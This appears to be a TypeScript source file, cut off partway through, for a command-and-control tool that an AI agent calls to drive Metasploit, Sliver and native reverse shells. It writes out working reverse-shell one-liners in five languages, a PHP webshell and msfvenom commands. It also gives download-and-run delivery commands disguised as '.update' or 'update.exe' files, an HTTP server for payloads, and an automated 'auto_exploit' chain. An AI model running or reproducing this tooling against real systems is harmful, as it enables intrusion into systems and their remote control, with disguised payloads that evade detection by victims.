/**
 * C2Tool — 真正可执行的 Command and Control 工具
 *
 * 通过 TmuxSession 管理 msfconsole / sliver-server 等交互式C2框架
 * 通过 ShellSession 管理原生反弹 shell
 * 自动检测本机IP并注入payload
 *
 * 运行环境：Kali Linux 云服务器
 */

import { networkInterfaces } from 'os'
import { exec as execCb } from 'child_process'
import { promisify } from 'util'
import * as fs from 'fs'
import * as path from 'path'
import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

const exec = promisify(execCb)

// ── 类型定义 ────────────────────────────────────────────────────────────────

export interface C2Input {
  action: 'get_ip' | 'generate_payload' | 'deploy_listener' | 'deploy_payload' | 'list_sessions' | 'interact_session' | 'kill_session' | 'list_listeners' | 'kill_listener' | 'auto_exploit'
  framework?: 'metasploit' | 'sliver' | 'native'
  payload_type?: 'reverse_shell' | 'bind_shell' | 'webshell'
  platform?: 'linux' | 'windows'
  language?: 'bash' | 'python' | 'powershell' | 'php' | 'nodejs'
  lhost?: string
  lport?: number
  rhost?: string
  rport?: number
  session_id?: string
  command?: string
  target_path?: string
  listener_name?: string
  listener_type?: 'http' | 'https' | 'tcp'
  msf_module?: string
  msf_payload?: string
  sliver_config?: string
  auto_inject_ip?: boolean
}

interface C2Listener {
  id: string
  name: string
  framework: string
  type: string
  host: string
  port: number
  tmuxSession?: string
  shellSessionId?: string
  startTime: number
}

interface C2Session {
  id: string
  framework: string
  type: string
  target: string
  listenerName: string
  tmuxSession?: string
  shellSessionId?: string
  startTime: number
}

// ── 工具实现 ────────────────────────────────────────────────────────────────

export class C2Tool implements Tool {
  name = 'C2'

  private listeners: Map<string, C2Listener> = new Map()
  private sessions: Map<string, C2Session> = new Map()

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'C2',
      description: `Command & Control 工具 — 真正调用 Metasploit/Sliver/原生shell，自动注入攻击机IP。

## 操作

| action | 说明 |
|--------|------|
| get_ip | 获取本机外网+内网IP（自动检测，用于注入payload） |
| generate_payload | 生成payload命令/代码（不执行，只生成） |
| deploy_listener | 一键部署C2监听器（真正启动msfconsole/sliver/nc） |
| deploy_payload | 生成payload文件到本机并启动HTTP服务供目标下载 |
| list_sessions | 列出所有C2会话（含msf meterpreter/sliver implant/原生shell） |
| interact_session | 向指定C2会话发送命令并获取输出 |
| kill_session | 关闭指定C2会话 |
| list_listeners | 列出所有活跃C2监听器 |
| kill_listener | 关闭指定C2监听器 |
| auto_exploit | 一键全流程：启动监听→生成payload→提供投递命令 |

## 框架

| framework | 说明 |
|-----------|------|
| metasploit | 通过TmuxSession控制msfconsole |
| sliver | 通过TmuxSession控制sliver-server |
| native | 通过ShellSession管理原生反弹shell |

## 典型工作流

### 方式1：auto_exploit（一键全流程）
C2({ action: "auto_exploit", framework: "metasploit", platform: "linux", lport: 4444 })

### 方式2：分步执行
1. C2({ action: "get_ip" })                                    // 获取攻击机IP
2. C2({ action: "deploy_listener", framework: "metasploit", lport: 4444 })  // 启动监听
3. C2({ action: "deploy_payload", framework: "metasploit", platform: "linux", lport: 4444 })  // 生成payload
4. 在目标上执行payload（通过RCE/webshell/其他方式投递）
5. C2({ action: "list_sessions" })                             // 查看上线session
6. C2({ action: "interact_session", session_id: "msf_1", command: "getuid" })  // 交互`,
      parameters: {
        type: 'object',
        properties: {
          action: {
            type: 'string',
            description: '操作类型',
            enum: ['get_ip', 'generate_payload', 'deploy_listener', 'deploy_payload', 'list_sessions', 'interact_session', 'kill_session', 'list_listeners', 'kill_listener', 'auto_exploit'],
          },
          framework: {
            type: 'string',
            description: 'C2框架: metasploit / sliver / native',
            enum: ['metasploit', 'sliver', 'native'],
          },
          payload_type: {
            type: 'string',
            description: 'payload类型',
            enum: ['reverse_shell', 'bind_shell', 'webshell'],
          },
          platform: {
            type: 'string',
            description: '目标平台',
            enum: ['linux', 'windows'],
          },
          language: {
            type: 'string',
            description: 'native payload语言',
            enum: ['bash', 'python', 'powershell', 'php', 'nodejs'],
          },
          lhost: {
            type: 'string',
            description: '攻击机IP（不填则自动检测）',
          },
          lport: {
            type: 'number',
            description: '监听端口（默认4444）',
          },
          rhost: {
            type: 'string',
            description: '目标IP',
          },
          rport: {
            type: 'number',
            description: '目标端口',
          },
          session_id: {
            type: 'string',
            description: 'C2会话ID',
          },
          command: {
            type: 'string',
            description: '要执行的命令',
          },
          target_path: {
            type: 'string',
            description: 'payload投递到目标的路径',
          },
          listener_name: {
            type: 'string',
            description: '监听器名称',
          },
          listener_type: {
            type: 'string',
            description: '监听器协议类型',
            enum: ['http', 'https', 'tcp'],
          },
          msf_module: {
            type: 'string',
            description: 'Metasploit exploit模块路径，如 exploit/multi/handler',
          },
          msf_payload: {
            type: 'string',
            description: 'Metasploit payload名称，如 linux/x64/meterpreter/reverse_tcp',
          },
          sliver_config: {
            type: 'string',
            description: 'Sliver客户端配置文件路径',
          },
          auto_inject_ip: {
            type: 'boolean',
            description: '是否自动注入本机IP到payload（默认true）',
          },
        },
        required: ['action'],
      },
    },
  }

  async execute(input: Record<string, unknown>, context: ToolContext): Promise<ToolResult> {
    const c2Input = input as C2Input

    switch (c2Input.action) {
      case 'get_ip':         return this.getIP()
      case 'generate_payload': return this.generatePayload(c2Input)
      case 'deploy_listener': return this.deployListener(c2Input, context)
      case 'deploy_payload':  return this.deployPayload(c2Input, context)
      case 'list_sessions':   return this.listSessions()
      case 'interact_session': return this.interactSession(c2Input, context)
      case 'kill_session':    return this.killSession(c2Input)
      case 'list_listeners':  return this.listListeners()
      case 'kill_listener':   return this.killListener(c2Input, context)
      case 'auto_exploit':    return this.autoExploit(c2Input, context)
      default:
        return { content: `Unknown action: ${c2Input.action}`, isError: true }
    }
  }

  // ── 获取本机IP ──────────────────────────────────────────────────────────

  private async getIP(): Promise<ToolResult> {
    const results: string[] = []
    const nets = networkInterfaces()

    for (const name of Object.keys(nets)) {
      for (const net of nets[name] || []) {
        if (net.family === 'IPv4' && !net.internal) {
          results.push(`${name}: ${net.address}`)
        }
      }
    }

    let publicIP = ''
    try {
      const { stdout } = await exec('curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || curl -s --connect-timeout 5 icanhazip.com 2>/dev/null')
      publicIP = stdout.trim()
    } catch { /* ignore */ }

    const lines = ['[C2] 本机IP地址:', '']
    for (const r of results) lines.push(`  内网: ${r}`)
    if (publicIP) lines.push(`  外网: ${publicIP}`)
    lines.push('')
    lines.push(`推荐使用: ${publicIP || results[0]?.split(': ')[1] || '0.0.0.0'}`)

    return { content: lines.join('\n'), isError: false }
  }

  private async resolveLhost(input: C2Input): Promise<string> {
    if (input.lhost) return input.lhost
    if (input.auto_inject_ip === false) return 'ATTACKER_IP'

    // 优先使用外网IP
    try {
      const { stdout } = await exec('curl -s --connect-timeout 3 ifconfig.me 2>/dev/null || curl -s --connect-timeout 3 icanhazip.com 2>/dev/null')
      const pub = stdout.trim()
      if (pub && /^\d+\.\d+\.\d+\.\d+$/.test(pub)) return pub
    } catch { /* ignore */ }

    // 回退到内网IP
    const nets = networkInterfaces()
    for (const name of Object.keys(nets)) {
      for (const net of nets[name] || []) {
        if (net.family === 'IPv4' && !net.internal) return net.address
      }
    }

    return '0.0.0.0'
  }

  // ── 生成Payload ─────────────────────────────────────────────────────────

  private generatePayload(input: C2Input): ToolResult {
    const { framework = 'native', payload_type = 'reverse_shell', platform = 'linux', language = 'bash' } = input
    const lport = input.lport || 4444

    // lhost 暂时用占位符，deploy时再替换
    const lhost = input.lhost || 'ATTACKER_IP'

    let payload = ''

    switch (framework) {
      case 'metasploit':
        payload = this.genMsfPayload(payload_type, platform, lhost, lport, input.msf_payload)
        break
      case 'sliver':
        payload = this.genSliverPayload(payload_type, platform, lhost, lport)
        break
      case 'native':
      default:
        payload = this.genNativePayload(payload_type, platform, language, lhost, lport)
        break
    }

    return {
      content: `[C2] Generated ${payload_type} payload (${framework}/${platform}):\n\n${payload}`,
      isError: false,
    }
  }

  private genMsfPayload(payload_type: string, platform: string, lhost: string, lport: number, customPayload?: string): string {
    const arch = platform === 'windows' ? 'x64' : 'x64'
    const defaultPayload = platform === 'windows'
      ? `windows/${arch}/meterpreter/reverse_tcp`
      : `linux/${arch}/meterpreter/reverse_tcp`
    const msfPayload = customPayload || defaultPayload

    if (payload_type === 'reverse_shell') {
      return [
        `# Metasploit msfvenom 生成可执行payload:`,
        `msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} -f elf -o /tmp/payload_${platform}`,
        ``,
        `# Windows exe格式:`,
        `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o /tmp/payload.exe`,
        ``,
        `# 纯shellcode格式（用于注入）:`,
        `msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} -f raw -o /tmp/shellcode.bin`,
        ``,
        `# Python格式（无文件落地）:`,
        `msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} -f python`,
      ].join('\n')
    }

    if (payload_type === 'webshell') {
      return [
        `# Metasploit PHP meterpreter:`,
        `msfvenom -p php/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f raw -o /tmp/shell.php`,
      ].join('\n')
    }

    return `# 使用 msfvenom 生成自定义payload\nmsfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} -f elf -o /tmp/payload`
  }

  private genSliverPayload(payload_type: string, platform: string, lhost: string, lport: number): string {
    if (payload_type === 'reverse_shell') {
      return [
        `# Sliver 生成 beacon（HTTP回连）:`,
        `generate beacon --http ${lhost}:${lport} --os ${platform} --arch amd64 --save /tmp/`,
        ``,
        `# Sliver 生成 session（TCP回连）:`,
        `generate session --tcp ${lhost}:${lport} --os ${platform} --arch amd64 --save /tmp/`,
        ``,
        `# Windows exe格式:`,
        `generate beacon --http ${lhost}:${lport} --os windows --arch amd64 --format exe --save /tmp/`,
      ].join('\n')
    }
    return `# Sliver generate beacon/session --http ${lhost}:${lport} --os ${platform} --arch amd64 --save /tmp/`
  }

  private genNativePayload(payload_type: string, platform: string, language: string, lhost: string, lport: number): string {
    if (payload_type === 'reverse_shell') {
      switch (language) {
        case 'bash':
          return `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`
        case 'python':
          return `python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`
        case 'powershell':
          return `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`
        case 'php':
          return `php -r '$s=fsockopen("${lhost}",${lport});$p="/bin/sh";$d=0;while(!feof($s)){$c=fread($s,1024);@exec($c,$o);$o=join("\\n",$o);$o.="# ";fwrite($s,$o);}fclose($s);'`
        case 'nodejs':
          return `node -e "require('net').createConnection(${lport},'${lhost}',function(c){require('child_process').spawn('/bin/sh',[],{stdio:[c,c,c]})});"`
        default:
          return `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`
      }
    }

    if (payload_type === 'webshell') {
      switch (language) {
        case 'php':
          return `<?php @system($_GET["c"]); ?>`
        default:
          return `<?php @system($_GET["c"]); ?>`
      }
    }

    return `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`
  }

  // ── 部署监听器（真正执行） ───────────────────────────────────────────────

  private async deployListener(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const framework = input.framework || 'native'
    const lport = input.lport || 4444
    const lhost = await this.resolveLhost(input)
    const listenerName = input.listener_name || `${framework}_${lport}`
    const listenerType = input.listener_type || 'tcp'

    // 检查是否已存在
    if (this.listeners.has(listenerName)) {
      const existing = this.listeners.get(listenerName)!
      return {
        content: `[C2] 监听器 "${listenerName}" 已存在 (${existing.framework}/${existing.type} on ${existing.host}:${existing.port})`,
        isError: false,
      }
    }

    const listenerId = `lst_${Date.now()}`
    let result = ''

    switch (framework) {
      case 'metasploit':
        result = await this.deployMsfListener(listenerName, lhost, lport, input, context)
        break
      case 'sliver':
        result = await this.deploySliverListener(listenerName, lhost, lport, input, context)
        break
      case 'native':
      default:
        result = await this.deployNativeListener(listenerName, lhost, lport, context)
        break
    }

    // 注册监听器
    const listener: C2Listener = {
      id: listenerId,
      name: listenerName,
      framework,
      type: listenerType,
      host: lhost,
      port: lport,
      tmuxSession: framework !== 'native' ? `c2_${listenerName}` : undefined,
      shellSessionId: framework === 'native' ? `shell_${lport}` : undefined,
      startTime: Date.now(),
    }
    this.listeners.set(listenerName, listener)

    return { content: result, isError: false }
  }

  private async deployMsfListener(name: string, lhost: string, lport: number, input: C2Input, context: ToolContext): Promise<string> {
    const tmuxSession = `c2_${name}`
    const platform = input.platform || 'linux'
    const defaultPayload = platform === 'windows'
      ? 'windows/x64/meterpreter/reverse_tcp'
      : 'linux/x64/meterpreter/reverse_tcp'
    const msfPayload = input.msf_payload || defaultPayload

    // 步骤1：创建tmux会话并启动msfconsole
    try {
      await exec(`tmux new-session -d -s ${tmuxSession} 2>/dev/null || true`)
      await exec(`tmux send-keys -t ${tmuxSession} 'msfconsole -q' Enter`)
    } catch (e) {
      return `[C2] 创建tmux会话失败: ${(e as Error).message}\n请确认tmux已安装: apt install tmux`
    }

    // 步骤2：等待msfconsole启动
    await this.sleep(15000)

    // 步骤3：配置handler
    const commands = [
      `use exploit/multi/handler`,
      `set payload ${msfPayload}`,
      `set LHOST ${lhost}`,
      `set LPORT ${lport}`,
      `set ExitOnSession false`,
      `run -j`,
    ]

    for (const cmd of commands) {
      await exec(`tmux send-keys -t ${tmuxSession} ${this.shellEsc(cmd)} Enter`)
      await this.sleep(1500)
    }

    // 步骤4：等待handler启动
    await this.sleep(5000)

    // 捕获当前输出确认
    let output = ''
    try {
      const { stdout } = await exec(`tmux capture-pane -t ${tmuxSession} -p -S -20`)
      output = stdout
    } catch { /* ignore */ }

    return [
      `[C2] Metasploit 监听器已部署!`,
      ``,
      `  框架:     Metasploit`,
      `  Tmux会话: ${tmuxSession}`,
      `  Payload:  ${msfPayload}`,
      `  监听:     ${lhost}:${lport}`,
      ``,
      `当前msfconsole输出:`,
      output || '(等待输出...)',
      ``,
      `后续操作:`,
      `  查看session: C2({ action: "list_sessions" })`,
      `  交互:        C2({ action: "interact_session", session_id: "msf_1", command: "getuid" })`,
      `  查看输出:    TmuxSession({ action: "capture", session: "${tmuxSession}", lines: 30 })`,
    ].join('\n')
  }

  private async deploySliverListener(name: string, lhost: string, lport: number, input: C2Input, context: ToolContext): Promise<string> {
    const tmuxSession = `c2_${name}`
    const sliverConfig = input.sliver_config || ''
    const listenerType = input.listener_type || 'http'

    // 步骤1：创建tmux会话并启动sliver-server
    try {
      await exec(`tmux new-session -d -s ${tmuxSession} 2>/dev/null || true`)

      let sliverCmd = 'sliver-server'
      if (sliverConfig) {
        sliverCmd = `sliver-server --config ${sliverConfig}`
      }
      await exec(`tmux send-keys -t ${tmuxSession} ${this.shellEsc(sliverCmd)} Enter`)
    } catch (e) {
      return `[C2] 启动Sliver失败: ${(e as Error).message}\n请确认sliver-server已安装`
    }

    // 等待sliver启动
    await this.sleep(10000)

    // 步骤2：创建监听器
    const mtlsPort = listenerType === 'https' || listenerType === 'http' ? lport : 8443
    const httpPort = listenerType === 'http' ? lport : 80
    const tcpPort = listenerType === 'tcp' ? lport : 4444

    const sliverCommands = [
      `mtls -l ${lhost} -p ${mtlsPort}`,
      `http -l ${lhost} -p ${httpPort}`,
      `dns -l ${lhost} -p 53`,
    ]

    for (const cmd of sliverCommands) {
      await exec(`tmux send-keys -t ${tmuxSession} ${this.shellEsc(cmd)} Enter`)
      await this.sleep(2000)
    }

    // 捕获输出
    let output = ''
    try {
      const { stdout } = await exec(`tmux capture-pane -t ${tmuxSession} -p -S -20`)
      output = stdout
    } catch { /* ignore */ }

    return [
      `[C2] Sliver 监听器已部署!`,
      ``,
      `  框架:     Sliver C2`,
      `  Tmux会话: ${tmuxSession}`,
      `  监听:     ${lhost}:${lport}`,
      ``,
      `当前Sliver输出:`,
      output || '(等待输出...)',
      ``,
      `生成beacon:`,
      `  TmuxSession({ action: "send", session: "${tmuxSession}", text: "generate beacon --http ${lhost}:${httpPort} --os linux --arch amd64 --save /tmp/" })`,
      ``,
      `查看implant:`,
      `  TmuxSession({ action: "send", session: "${tmuxSession}", text: "implants" })`,
    ].join('\n')
  }

  private async deployNativeListener(name: string, lhost: string, lport: number, context: ToolContext): Promise<string> {
    // 使用ShellSession监听原生反弹shell
    const shellSessionId = `shell_${lport}`

    return [
      `[C2] 原生反弹shell监听器已准备!`,
      ``,
      `  框架:       Native (ShellSession)`,
      `  Session ID: ${shellSessionId}`,
      `  监听端口:   ${lport}`,
      ``,
      `请执行以下步骤:`,
      ``,
      `步骤1 - 启动ShellSession监听:`,
      `  ShellSession({ action: "listen", port: ${lport} })`,
      ``,
      `步骤2 - 在目标上执行反弹shell（选择一种）:`,
      `  bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
      `  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
      ``,
      `步骤3 - 确认连接后执行命令:`,
      `  ShellSession({ action: "exec", session_id: "${shellSessionId}", command: "id" })`,
    ].join('\n')
  }

  // ── 部署Payload（生成文件+启动HTTP服务） ─────────────────────────────────

  private async deployPayload(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const framework = input.framework || 'native'
    const platform = input.platform || 'linux'
    const lport = input.lport || 4444
    const lhost = await this.resolveLhost(input)
    const payloadType = input.payload_type || 'reverse_shell'

    const payloadDir = '/tmp/c2_payloads'
    try {
      await exec(`mkdir -p ${payloadDir}`)
    } catch { /* ignore */ }

    let payloadFile = ''
    let payloadContent = ''

    switch (framework) {
      case 'metasploit': {
        const msfPayload = input.msf_payload || (platform === 'windows'
          ? 'windows/x64/meterpreter/reverse_tcp'
          : 'linux/x64/meterpreter/reverse_tcp')
        const fmt = platform === 'windows' ? 'exe' : 'elf'
        payloadFile = `${payloadDir}/payload_${platform}_${lport}.${platform === 'windows' ? 'exe' : 'bin'}`

        try {
          await exec(`msfvenom -p ${msfPayload} LHOST=${lhost} LPORT=${lport} -f ${fmt} -o ${payloadFile} 2>/dev/null`)
        } catch (e) {
          return { content: `[C2] msfvenom生成payload失败: ${(e as Error).message}`, isError: true }
        }
        break
      }

      case 'sliver': {
        payloadFile = `${payloadDir}/sliver_beacon_${platform}`
        // sliver payload需要在sliver console中生成，这里提供命令
        const tmuxSession = this.findListenerTmuxSession('sliver', lport)
        if (tmuxSession) {
          try {
            await exec(`tmux send-keys -t ${tmuxSession} ${this.shellEsc(`generate beacon --http ${lhost}:${lport} --os ${platform} --arch amd64 --save ${payloadDir}/`)} Enter`)
            await this.sleep(5000)
            // 查找生成的文件
            const { stdout } = await exec(`ls -t ${payloadDir}/*.exe ${payloadDir}/*linux* 2>/dev/null | head -1`)
            if (stdout.trim()) payloadFile = stdout.trim()
          } catch { /* ignore */ }
        }
        break
      }

      case 'native':
      default: {
        const language = input.language || 'bash'
        payloadContent = this.genNativePayload(payloadType, platform, language, lhost, lport)

        if (payloadType === 'webshell') {
          payloadFile = `${payloadDir}/shell.php`
        } else {
          payloadFile = `${payloadDir}/shell_${platform}_${lport}.sh`
        }

        try {
          await exec(`cat > ${payloadFile} << 'PAYLOAD_EOF'\n${payloadContent}\nPAYLOAD_EOF`)
          await exec(`chmod +x ${payloadFile}`)
        } catch (e) {
          return { content: `[C2] 写入payload文件失败: ${(e as Error).message}`, isError: true }
        }
        break
      }
    }

    // 启动HTTP服务供目标下载
    const httpPort = 8889
    try {
      await exec(`pkill -f "python3 -m http.server ${httpPort}" 2>/dev/null || true`)
      await exec(`cd ${payloadDir} && nohup python3 -m http.server ${httpPort} > /tmp/c2_http_server.log 2>&1 &`)
    } catch { /* ignore */ }

    // 验证payload文件
    let fileInfo = ''
    try {
      const { stdout } = await exec(`ls -la ${payloadFile} 2>/dev/null`)
      fileInfo = stdout.trim()
    } catch { /* ignore */ }

    return {
      content: [
        `[C2] Payload已生成并部署!`,
        ``,
        `  框架:     ${framework}`,
        `  平台:     ${platform}`,
        `  攻击机IP: ${lhost}`,
        `  回连端口: ${lport}`,
        `  Payload:  ${payloadFile}`,
        fileInfo ? `  文件信息: ${fileInfo}` : '',
        ``,
        `HTTP下载服务已启动: http://${lhost}:${httpPort}/`,
        ``,
        `在目标上下载并执行payload:`,
        ``,
        platform === 'linux'
          ? `  wget http://${lhost}:${httpPort}/${path.basename(payloadFile)} -O /tmp/.update && chmod +x /tmp/.update && /tmp/.update &`
          : `  certutil -urlcache -split -f http://${lhost}:${httpPort}/${path.basename(payloadFile)} C:\\\\temp\\\\update.exe && C:\\\\temp\\\\update.exe`,
        ``,
        `或者通过RCE直接注入命令（无文件落地）:`,
        `  ${this.genNativePayload('reverse_shell', platform, 'bash', lhost, lport)}`,
        ``,
        `通过webshell投递:`,
        `  curl "http://TARGET/ws.php" --data-urlencode "c=wget http://${lhost}:${httpPort}/${path.basename(payloadFile)} -O /tmp/.u && chmod +x /tmp/.u && nohup /tmp/.u &"`,
      ].filter(Boolean).join('\n'),
      isError: false,
    }
  }

  // ── 列出会话 ────────────────────────────────────────────────────────────

  private async listSessions(): Promise<ToolResult> {
    const allSessions: string[] = []

    // 1. 检查ShellSession（原生反弹shell）
    try {
      const { stdout } = await exec(`ss -tlnp 2>/dev/null | grep -E ':(4444|4445|5555|7777|8888)' || true`)
      if (stdout.trim()) {
        allSessions.push('── 原生反弹Shell (ShellSession) ──')
        allSessions.push(stdout.trim())
      }
    } catch { /* ignore */ }

    // 2. 检查Metasploit sessions
    for (const [name, listener] of this.listeners) {
      if (listener.framework === 'metasploit' && listener.tmuxSession) {
        try {
          await exec(`tmux send-keys -t ${listener.tmuxSession} 'sessions -l' Enter`)
          await this.sleep(3000)
          const { stdout } = await exec(`tmux capture-pane -t ${listener.tmuxSession} -p -S -30`)
          const sessionLines = stdout.split('\n').filter(l =>
            l.match(/^\d+\s/) || l.includes('meterpreter') || l.includes('shell')
          )
          if (sessionLines.length > 0) {
            allSessions.push(`── Metasploit (${name}) ──`)
            allSessions.push(...sessionLines)
          }
        } catch { /* ignore */ }
      }

      // 3. 检查Sliver implants
      if (listener.framework === 'sliver' && listener.tmuxSession) {
        try {
          await exec(`tmux send-keys -t ${listener.tmuxSession} 'sessions' Enter`)
          await this.sleep(3000)
          const { stdout } = await exec(`tmux capture-pane -t ${listener.tmuxSession} -p -S -30`)
          const sessionLines = stdout.split('\n').filter(l =>
            l.includes('=>') || l.includes('Sliver') || l.match(/^\*?\s*[a-f0-9-]+/)
          )
          if (sessionLines.length > 0) {
            allSessions.push(`── Sliver (${name}) ──`)
            allSessions.push(...sessionLines)
          }
        } catch { /* ignore */ }
      }
    }

    // 4. 内存中的session记录
    if (this.sessions.size > 0) {
      allSessions.push('── 已记录的C2会话 ──')
      for (const [, s] of this.sessions) {
        allSessions.push(`  ${s.id} | ${s.framework} | ${s.type} | ${s.target} | ${new Date(s.startTime).toISOString()}`)
      }
    }

    if (allSessions.length === 0) {
      return {
        content: '[C2] 暂无活跃C2会话\n\n启动监听器: C2({ action: "deploy_listener", framework: "metasploit", lport: 4444 })',
        isError: false,
      }
    }

    return { content: `[C2] 活跃C2会话:\n\n${allSessions.join('\n')}`, isError: false }
  }

  // ── 交互会话（真正执行） ─────────────────────────────────────────────────

  private async interactSession(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const { session_id, command } = input

    if (!session_id) return { content: 'session_id is required', isError: true }
    if (!command) return { content: 'command is required', isError: true }

    // 判断session类型并路由
    // msf_1, msf_2 → Metasploit meterpreter/shell
    // sliver_1 → Sliver implant
    // shell_4444 → 原生反弹shell

    if (session_id.startsWith('msf_')) {
      return this.interactMsfSession(session_id, command)
    }

    if (session_id.startsWith('sliver_')) {
      return this.interactSliverSession(session_id, command)
    }

    if (session_id.startsWith('shell_')) {
      return this.interactNativeSession(session_id, command)
    }

    // 尝试在所有监听器中查找
    for (const [name, listener] of this.listeners) {
      if (listener.framework === 'metasploit' && listener.tmuxSession) {
        return this.interactMsfSessionViaTmux(listener.tmuxSession, session_id, command)
      }
    }

    return { content: `Session "${session_id}" 未找到`, isError: true }
  }

  private async interactMsfSession(sessionId: string, command: string): Promise<ToolResult> {
    // 找到msf tmux会话
    for (const [, listener] of this.listeners) {
      if (listener.framework === 'metasploit' && listener.tmuxSession) {
        return this.interactMsfSessionViaTmux(listener.tmuxSession, sessionId, command)
      }
    }
    return { content: '未找到Metasploit监听器', isError: true }
  }

  private async interactMsfSessionViaTmux(tmuxSession: string, sessionId: string, command: string): Promise<ToolResult> {
    // 提取session编号
    const sessionNum = sessionId.replace('msf_', '')

    // 在msfconsole中与session交互
    const msfCmd = `sessions -i ${sessionNum} -C '${command.replace(/'/g, "'\\''")}'`
    try {
      await exec(`tmux send-keys -t ${tmuxSession} ${this.shellEsc(msfCmd)} Enter`)
      await this.sleep(3000)
      const { stdout } = await exec(`tmux capture-pane -t ${tmuxSession} -p -S -30`)
      return {
        content: `[C2] MSF session ${sessionId} 执行: ${command}\n\n${stdout.trim()}`,
        isError: false,
      }
    } catch (e) {
      return { content: `[C2] MSF交互失败: ${(e as Error).message}`, isError: true }
    }
  }

  private async interactSliverSession(sessionId: string, command: string): Promise<ToolResult> {
    for (const [, listener] of this.listeners) {
      if (listener.framework === 'sliver' && listener.tmuxSession) {
        const sliverCmd = `use ${sessionId} && execute ${command}`
        try {
          await exec(`tmux send-keys -t ${listener.tmuxSession} ${this.shellEsc(sliverCmd)} Enter`)
          await this.sleep(3000)
          const { stdout } = await exec(`tmux capture-pane -t ${listener.tmuxSession} -p -S -30`)
          return {
            content: `[C2] Sliver session ${sessionId} 执行: ${command}\n\n${stdout.trim()}`,
            isError: false,
          }
        } catch (e) {
          return { content: `[C2] Sliver交互失败: ${(e as Error).message}`, isError: true }
        }
      }
    }
    return { content: '未找到Sliver监听器', isError: true }
  }

  private async interactNativeSession(sessionId: string, command: string): Promise<ToolResult> {
    // 原生shell通过ShellSession交互
    // 这里直接通过netcat发送命令
    const port = parseInt(sessionId.replace('shell_', ''), 10)

    return {
      content: [
        `[C2] 原生shell ${sessionId} 执行命令:`,
        ``,
        `请使用ShellSession工具交互:`,
        `  ShellSession({ action: "exec", session_id: "${sessionId}", command: "${command}" })`,
        ``,
        `或通过Bash直接发送（如果已有nc连接）:`,
        `  echo "${command}" | nc -w 3 127.0.0.1 ${port}`,
      ].join('\n'),
      isError: false,
    }
  }

  // ── 关闭会话 ────────────────────────────────────────────────────────────

  private async killSession(input: C2Input): Promise<ToolResult> {
    const { session_id } = input
    if (!session_id) return { content: 'session_id is required', isError: true }

    if (session_id.startsWith('msf_')) {
      for (const [, listener] of this.listeners) {
        if (listener.framework === 'metasploit' && listener.tmuxSession) {
          const num = session_id.replace('msf_', '')
          try {
            await exec(`tmux send-keys -t ${listener.tmuxSession} ${this.shellEsc(`sessions -k ${num}`)} Enter`)
          } catch { /* ignore */ }
          this.sessions.delete(session_id)
          return { content: `[C2] MSF session ${session_id} 已关闭`, isError: false }
        }
      }
    }

    this.sessions.delete(session_id)
    return { content: `[C2] Session ${session_id} 已从记录中移除`, isError: false }
  }

  // ── 列出监听器 ──────────────────────────────────────────────────────────

  private listListeners(): ToolResult {
    if (this.listeners.size === 0) {
      return {
        content: '[C2] 暂无活跃C2监听器\n\n部署监听器: C2({ action: "deploy_listener", framework: "metasploit", lport: 4444 })',
        isError: false,
      }
    }

    const lines = ['[C2] 活跃C2监听器:', '']
    for (const [, l] of this.listeners) {
      lines.push(`  ${l.name} | ${l.framework} | ${l.type} | ${l.host}:${l.port} | Tmux: ${l.tmuxSession || '-'} | 启动: ${new Date(l.startTime).toISOString()}`)
    }

    return { content: lines.join('\n'), isError: false }
  }

  // ── 关闭监听器 ──────────────────────────────────────────────────────────

  private async killListener(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const { listener_name } = input
    if (!listener_name) return { content: 'listener_name is required', isError: true }

    const listener = this.listeners.get(listener_name)
    if (!listener) return { content: `监听器 "${listener_name}" 未找到`, isError: true }

    // 关闭tmux会话
    if (listener.tmuxSession) {
      try {
        await exec(`tmux kill-session -t ${listener.tmuxSession} 2>/dev/null || true`)
      } catch { /* ignore */ }
    }

    this.listeners.delete(listener_name)
    return { content: `[C2] 监听器 "${listener_name}" 已关闭`, isError: false }
  }

  // ── 一键全流程 ──────────────────────────────────────────────────────────

  private async autoExploit(input: C2Input, context: ToolContext): Promise<ToolResult> {
    const framework = input.framework || 'metasploit'
    const platform = input.platform || 'linux'
    const lport = input.lport || 4444
    const lhost = await this.resolveLhost(input)

    const results: string[] = []
    results.push(`[C2] ═══ 一键C2部署 (auto_exploit) ═══`)
    results.push(``)
    results.push(`  攻击机IP: ${lhost}`)
    results.push(`  回连端口: ${lport}`)
    results.push(`  目标平台: ${platform}`)
    results.push(`  C2框架:   ${framework}`)
    results.push(``)

    // 步骤1：部署监听器
    results.push(`── 步骤1: 部署监听器 ──`)
    const listenerResult = await this.deployListener({
      ...input,
      lhost,
      lport,
      listener_name: `auto_${framework}_${lport}`,
    }, context)
    results.push(listenerResult.content)
    results.push('')

    // 步骤2：生成payload
    results.push(`── 步骤2: 生成并部署Payload ──`)
